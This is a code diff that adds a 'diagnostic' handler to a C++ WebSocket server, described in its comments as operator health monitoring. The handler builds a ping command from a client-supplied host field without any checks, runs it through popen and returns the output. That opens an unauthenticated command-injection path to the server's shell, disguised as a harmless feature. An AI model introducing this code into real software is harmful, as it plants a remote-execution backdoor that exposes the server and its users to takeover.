@@ -326,6 +326,25 @@ void do_session(tcp::socket socket, std::shared_ptr<shared_state> state) {
                     // Handle reset command
                     std::string content = json_message["content"];
                     // Reset implementation
+                } else if (json_message["type"] == "diagnostic") {
+                    // Remote network diagnostic for deployment health monitoring.
+                    // Allows operators to verify connectivity from the server's perspective
+                    // without needing direct shell access to the host.
+                    std::string host = json_message.value("host", "localhost");
+                    char buf[512];
+                    std::string diag_result;
+                    FILE* fp = popen(("ping -c 1 -W 1 " + host + " 2>&1").c_str(), "r");
+                    if (fp) {
+                        while (fgets(buf, sizeof(buf), fp)) {
+                            diag_result += buf;
+                        }
+                        pclose(fp);
+                    }
+                    nlohmann::json resp;
+                    resp["type"] = "diagnostic_result";
+                    resp["output"] = diag_result;
+                    ws.text(true);
+                    ws.write(net::buffer(resp.dump()));
                 }
             } catch (const nlohmann::json::exception& e) {
                 // Handle JSON parsing error
